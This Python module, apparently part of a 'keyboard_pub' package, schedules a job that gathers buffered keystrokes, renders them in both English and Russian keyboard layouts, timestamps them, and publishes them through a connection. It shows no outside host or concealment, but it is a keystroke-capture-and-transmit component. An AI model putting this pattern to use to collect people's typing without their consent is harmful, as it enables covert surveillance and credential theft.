import time
from datetime import datetime

from apscheduler.schedulers.background import BackgroundScheduler
from pytz import timezone

from keyboard_pub.connection import publisher
from keyboard_pub.settings import DELAY, TIMEZONE
from keyboard_pub.storage import memory
from keyboard_pub.translation import RU

job_defaults = {
    'coalesce': True,
}


scheduler = BackgroundScheduler(job_defaults=job_defaults, timezone=timezone(TIMEZONE))


@scheduler.scheduled_job('interval', seconds=1)
def send_collected_data():
    if time.time() - memory.last < DELAY or not memory.seq:
        return
    payload = [memory.seq.pop(0) for _ in range(len(memory.seq))]
    collected_data = {
        'en': ''.join(payload),
        'ru': ''.join(map(RU, payload)),
        'date': str(datetime.now(tz=timezone(TIMEZONE))),
    }
    publisher.send(collected_data)
